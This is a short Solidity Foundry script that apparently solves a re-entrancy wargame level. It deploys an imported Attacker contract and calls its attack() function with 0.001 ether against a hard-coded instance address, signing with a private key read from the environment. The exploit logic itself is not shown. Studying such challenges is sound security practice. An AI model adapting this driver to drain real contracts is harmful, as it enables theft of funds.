// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../src/Re-entrancy.sol";
import "../src/Attacker.sol";
pragma experimental ABIEncoderV2;

contract ReentranceScript is Script {
    
    address instance = 0xAC10925ca9460894cFEC04eE67Cc0E351762C5aB;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attacker attacker = new Attacker();
        attacker.attack{value: 0.001 ether}();
        vm.stopBroadcast();
    }
}
